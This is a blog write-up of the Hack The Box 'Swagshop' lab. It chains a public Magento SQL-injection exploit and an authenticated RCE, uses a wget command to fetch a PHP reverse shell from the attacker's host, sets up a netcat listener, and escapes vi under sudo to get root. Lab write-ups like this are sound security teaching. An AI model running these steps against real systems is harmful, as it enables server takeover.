---
layout: post
title:  "HTB - Swagshop Write-up"
description: <img src="https://werdinfosec.com/images/2019-09-28/image0.png" class="centered" />

date:   2019-09-28 
categories: hackthebox hack the box swagshop swag shop write-up writeup write up
---

<img src="https://werdinfosec.com/images/2019-09-28/image1.png" class="centered" />

<br/>

Hostname: swagshop.htb
======================

IP: 10.10.10.140
================

OS: Ubuntu 16.04
================

Difficulty: Easy
================

Creator: ch4p
=============
<br/>
<br/>
<br/>

TL;DR
=====
Swagshop is an easy linux box on HackTheBox, which is running a vulnerable version of Magento. Using a python exploit, a sql injection creates an admin account.
After creating the admin account a remote code execution python exploit allows for downloading a shell to the webroot. After triggering the reverse shell, loose restictions on sudo allow www-data to run 
vi on files in /var/www/html as root with no password. Escaping vi with a classic shell escape provides a shell as root.

<br/>

Enumeration
===========

Enumeration starts with a quick nmap scan. This reveals two open ports, 22 and 80. 

*command: nmap -sC -sV 10.10.10.140*
<img src="https://werdinfosec.com/images/2019-09-28/image2.png" class="centered" />

Visiting port 80 a magento page is discovered. 

*url: http://10.10.10.140*
<img src="https://werdinfosec.com/images/2019-09-28/image3.png" class="centered" />

Magento version enumeration is done by visting RELEASE_NOTES.txt

*url:http://10.10.10.140/RELEASE_NOTES.txt*
<img src="https://werdinfosec.com/images/2019-09-28/image4.png" class="centered" />

<br/>

Exploitation
============

The first [exploit] used creates an admin user on the Magento Web Application through a sql injection.

*command: searchsploit magento*
<img src="https://werdinfosec.com/images/2019-09-28/image5.png" class="centered" />

Mirroring the exploit to the working directory.

*command: searchsploit -m exploits/xml/webapps/37877.py*
<img src="https://werdinfosec.com/images/2019-09-28/image6.png" class="centered" />

For the exploit to work, remove all uncommented text. We are required to add the target ip to the exploit. The path has to be altered, as it is incorrect.

<img src="https://werdinfosec.com/images/2019-09-28/image7.png" class="centered" />

Set the new admin username and password to anything you'd like. I chose the username and password newadmin:hacker

<img src="https://werdinfosec.com/images/2019-09-28/image8.png" class="centered" />

Running the modified exploit.

*command python magentoexploit.py*
<img src="https://werdinfosec.com/images/2019-09-28/image9.png" class="centered" />

Logging in as 'newadmin to confirm that we have created a valid admin user.

*url: http://10.10.10.140/index.php/admin/*
<img src="https://werdinfosec.com/images/2019-09-28/image10.png" class="centered" />

<br/>

Remote Code Execution Exploit
=============================

Finding an [Authenticated Remote Code Execution Exploit].

<img src="https://werdinfosec.com/images/2019-09-28/image11.png" class="centered" />

Mirroring the exploit to current directory.

<img src="https://werdinfosec.com/images/2019-09-28/image12.png" class="centered" />

The exploit requires the exact date and time of the installation. This information can be found at /app/etc/local.xml

*url: http://10.10.10.140/app/etc/local.xml*
<img src="https://werdinfosec.com/images/2019-09-28/image13.png" class="centered" />

This exploit requires that username and password are defined. Change the install_date variable toreflect local.xml. Also the manual username control prevents the exploit from executing successfully.

<img src="https://werdinfosec.com/images/2019-09-28/image14.png" class="centered" />
<img src="https://werdinfosec.com/images/2019-09-28/image15.png" class="centered" />

Running the exploit. Executing whoami and pwd.

*command python authenticatedrec.py http://10.10.10.140/index.php/admin/ "whoami"*
*command python authenticatedrec.py http://10.10.10.140/index.php/admin/ "pwd"*
<img src="https://werdinfosec.com/images/2019-09-28/image16.png" class="centered" />

Downloading a reverse shell to /var/www/html allows for executing the php when triggered through a web browser. 
Starting python simpleHTTPserver to serve the [pentest monkey reverse shell]. Don't forget to change the IP and Port variable to reflect the attacker's listener information.

*command: python -m SimpleHTTPServer 80*
<img src="https://werdinfosec.com/images/2019-09-28/image17.png" class="centered" />

Downloading the reverse shell with the exploits remote code execution.

*command python authenticatedrec.py http://10.10.10.140/index.php/admin/ "wget http://10.10.14.20/revsh.php"*
<img src="https://werdinfosec.com/images/2019-09-28/image18.png" class="centered" />

Starting a netcat listener:

*command: nc -lvnp 443*
<img src="https://werdinfosec.com/images/2019-09-28/image19.png" class="centered" />

Triggering the reverse shell.

*url: http://10.10.10.140/revsh.php*
<img src="https://werdinfosec.com/images/2019-09-28/image20.png" class="centered" />

Catching the reverse shell as user www-data

<img src="https://werdinfosec.com/images/2019-09-28/image21.png" class="centered" />

Privilege Escalation
====================

First things first, upgrade to a tty with python3. Python 2 is not on this system, but python3 is. 

*command: python3 -c "import pty; pty.spawn('/bin/bash')"*
<img src="https://werdinfosec.com/images/2019-09-28/image22.png" class="centered" />

It appears www-data can run /usr/bin/vi on any file in the /var/www/html directory as root without a password.

*command: sudo -l*
<img src="https://werdinfosec.com/images/2019-09-28/image23.png" class="centered" />

Running the following command will start vi as root. Using vi we can execute any bash command by prepending the command with ':!'.

*command: sudo vi /var/www/html/anyfile*
<img src="https://werdinfosec.com/images/2019-09-28/image24.png" class="centered" />

The shell escape sequence:

*command: :! /bin/bash*
<img src="https://werdinfosec.com/images/2019-09-28/image25.png" class="centered" />

<br/>

ROOTED
======

<img src="https://werdinfosec.com/images/2019-09-28/image26.png" class="centered" />

Flags:

<img src="https://werdinfosec.com/images/2019-09-28/image27.png" class="centered" />


[pentest monkey reverse shell]:https://github.com/pentestmonkey/php-reverse-shell
[Authenticated Remote Code Execution Exploit]:https://www.exploit-db.com/exploits/37811
[exploit]:https://www.exploit-db.com/exploits/37977
